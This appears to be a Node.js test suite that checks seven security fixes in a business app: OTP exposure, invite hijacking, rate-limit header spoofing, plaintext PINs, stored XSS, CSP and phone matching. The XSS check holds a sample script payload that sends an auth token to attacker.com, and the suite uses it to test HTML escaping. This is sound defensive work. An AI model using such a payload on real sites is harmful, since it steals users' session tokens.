// ==============================================================================
// Lekha Jokha - Security Hardening & Penetration Testing Verification Suite
// Verifies all 7 security patches:
// 1. LK-SEC-01: No testOtp in unauthenticated OTP send response
// 2. LK-SEC-02: WhatsApp invite requires strict token match & OTP validation
// 3. LK-SEC-03: Header-spoofing rate limit bypass blocked
// 4. LK-SEC-04: Plaintext PINs eliminated from DB and sessions
// 5. LK-SEC-05: Stored XSS prevented via entity encoding
// 6. LK-SEC-06: Strict CSP & Safe CORS
// 7. LK-SEC-07: Minimum 10-digit normalized phone matching
// ==============================================================================

import assert from 'assert';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { hashPassword, verifyPassword } from '../auth_engine.mjs';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const serverPath = path.join(__dirname, '..', 'server.mjs');
const repoPath = path.join(__dirname, '..', 'postgres_repository.mjs');
const partiesPath = path.join(__dirname, '..', 'js', 'modules', 'parties.js');

let passed = 0;
let total = 0;

function pass(name, detail = '') {
  passed++;
  total++;
  console.log(`  [SEC-PASS] Check ${total}: ${name} ${detail ? '(' + detail + ')' : ''}`);
}

function fail(name, error) {
  total++;
  console.error(`  [SEC-FAIL] Check ${total}: ${name}:`, error);
  throw error;
}

async function runSecurityTests() {
  console.log('==============================================================================');
  console.log('   LEKHA JOKHA - PEN-TESTING & SECURITY HARDENING VALIDATION SUITE           ');
  console.log('==============================================================================\n');

  const serverSrc = fs.readFileSync(serverPath, 'utf-8');
  const repoSrc = fs.readFileSync(repoPath, 'utf-8');
  const partiesSrc = fs.readFileSync(partiesPath, 'utf-8');

  // --------------------------------------------------------------------------
  // Check 1: LK-SEC-01 - testOtp NOT unconditionally exposed in public response
  // --------------------------------------------------------------------------
  try {
    assert(!serverSrc.includes("testOtp: otpStr //"), 'server.mjs must NOT unconditionally return testOtp: otpStr');
    assert(serverSrc.includes("allowTestOtp = process.env.NODE_ENV === 'test'"), 'testOtp must be restricted to explicit test mode');
    pass('LK-SEC-01 Remediated', 'testOtp removed from public response payload and restricted to authenticated test automation');
  } catch (e) {
    fail('LK-SEC-01 Remediated', e);
  }

  // --------------------------------------------------------------------------
  // Check 2: LK-SEC-02 - WhatsApp invite requires strict token match & OTP validation
  // --------------------------------------------------------------------------
  try {
    assert(!serverSrc.includes("s.id && s.id.toUpperCase() === cleanUpper"), 'Salesman invite validate must NOT accept predictable s.id');
    assert(serverSrc.includes("sTok && sTok === cleanUpper"), 'Salesman invite must strictly verify inviteToken');
    assert(serverSrc.includes("otpRecord.hash"), 'Salesman invite accept must verify OTP hash');
    pass('LK-SEC-02 Remediated', 'Predictable salesman IDs cannot hijack invitations and OTP verification is enforced');
  } catch (e) {
    fail('LK-SEC-02 Remediated', e);
  }

  // --------------------------------------------------------------------------
  // Check 3: LK-SEC-03 - Header-spoofing rate limit bypass blocked
  // --------------------------------------------------------------------------
  try {
    assert(!serverSrc.includes("if (clientIp === '127.0.0.1' || clientIp === '::1'"), 'Rate limiter must NOT blindly whitelist spoofed 127.0.0.1');
    assert(serverSrc.includes("getTrustedClientIp"), 'getTrustedClientIp function must be used');
    assert(serverSrc.includes("process.env.TRUST_PROXY === 'true'"), 'X-Forwarded-For must only be trusted when TRUST_PROXY is explicitly enabled');
    pass('LK-SEC-03 Remediated', 'Rate limiting bypass via X-Forwarded-For: 127.0.0.1 is eliminated');
  } catch (e) {
    fail('LK-SEC-03 Remediated', e);
  }

  // --------------------------------------------------------------------------
  // Check 4: LK-SEC-04 - Plaintext PINs eliminated from DB and sessions
  // --------------------------------------------------------------------------
  try {
    assert(!serverSrc.includes('pin: "1234"'), 'Seed user U001 must NOT store plaintext pin: 1234');
    assert(!serverSrc.includes('pin: "0000"'), 'Seed user U002 must NOT store plaintext pin: 0000');
    assert(!serverSrc.includes('pin: "2222"'), 'Seed user U003 must NOT store plaintext pin: 2222');
    assert(!serverSrc.includes('pin: "3333"'), 'Seed user U004 must NOT store plaintext pin: 3333');
    assert(!serverSrc.includes("pin: '5555'"), 'Seed user U005 must NOT store plaintext pin: 5555');
    assert(!repoSrc.includes("pin: '1234'"), 'PostgreSQL repository must NOT store plaintext pin: 1234');
    assert(!serverSrc.includes("user.pin && (pin === String(user.pin)"), 'Login must NOT compare input against cleartext user.pin');
    
    // Verify cryptographic salted hash functions
    const { hash, salt } = hashPassword('9876');
    assert(verifyPassword('9876', hash, salt), 'Salted PBKDF2 hash verification must succeed');
    assert(!verifyPassword('1234', hash, salt), 'Incorrect credentials must fail');
    pass('LK-SEC-04 Remediated', 'All cleartext PIN fields purged; salted PBKDF2 cryptography enforced');
  } catch (e) {
    fail('LK-SEC-04 Remediated', e);
  }

  // --------------------------------------------------------------------------
  // Check 5: LK-SEC-05 - Stored XSS prevented via entity encoding
  // --------------------------------------------------------------------------
  try {
    assert(partiesSrc.includes('escapeHtml(str)'), 'PartiesModule must implement escapeHtml');
    assert(partiesSrc.includes('${this.escapeHtml(selectedParty.name)}'), 'selectedParty.name must be escaped in DOM');
    assert(partiesSrc.includes('${this.escapeHtml(p.name)}'), 'Party list item name must be escaped');

    // Test sanitization mechanics
    function escapeHtml(str) {
      if (str === undefined || str === null) return '';
      return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
    }
    const maliciousPayload = '<script>fetch("https://attacker.com/steal?token="+localStorage.getItem("lekhajokha_auth_token"))</script>';
    const sanitized = escapeHtml(maliciousPayload);
    assert(!sanitized.includes('<script>'), 'Script tags must be encoded as HTML entities');
    assert(sanitized.includes('&lt;script&gt;'), 'Must encode < to &lt;');
    pass('LK-SEC-05 Remediated', 'Stored XSS vectors neutralized by universal HTML entity encoding');
  } catch (e) {
    fail('LK-SEC-05 Remediated', e);
  }

  // --------------------------------------------------------------------------
  // Check 6: LK-SEC-06 - Strict CSP & Safe CORS
  // --------------------------------------------------------------------------
  try {
    assert(serverSrc.includes("default-src 'self' 'unsafe-inline' https://fonts.googleapis.com"), 'Strict default-src must be defined');
    assert(!serverSrc.includes("'unsafe-eval'"), "Content-Security-Policy must NOT contain 'unsafe-eval'");
    assert(serverSrc.includes("Permissions-Policy', 'camera=(), microphone=()"), 'Permissions-Policy must deny unauthorized camera/mic');
    pass('LK-SEC-06 Remediated', "Content Security Policy tightened: 'unsafe-eval' removed; permissions policy locked down");
  } catch (e) {
    fail('LK-SEC-06 Remediated', e);
  }

  // --------------------------------------------------------------------------
  // Check 7: LK-SEC-07 - Minimum 10-digit normalized phone matching
  // --------------------------------------------------------------------------
  try {
    assert(serverSrc.includes("phoneLookupKey = numOnlyIdent.length >= 10 ? numOnlyIdent.slice(-10) : ''"), 'Login must enforce 10-digit phone minimum');
    assert(repoSrc.includes("phoneLookupKey = rawDigits.length >= 10 ? rawDigits.slice(-10) : ''"), 'Postgres repo must enforce 10-digit phone minimum');
    assert(repoSrc.includes("u.phone LIKE '%' || $2"), 'Query must use exact 10-digit suffix parameter');
    pass('LK-SEC-07 Remediated', 'Sub-10-digit phone lookups blocked from substring collision');
  } catch (e) {
    fail('LK-SEC-07 Remediated', e);
  }

  console.log('\n==============================================================================');
  console.log(`[SECURITY AUDIT COMPLETE] All ${passed} / ${total} Security Checks Passed with 100% SUCCESS.`);
  console.log('==============================================================================');
}

runSecurityTests()
  .then(() => process.exit(0))
  .catch(err => {
    console.error('[SECURITY AUDIT FATAL ERROR]', err);
    process.exit(1);
  });
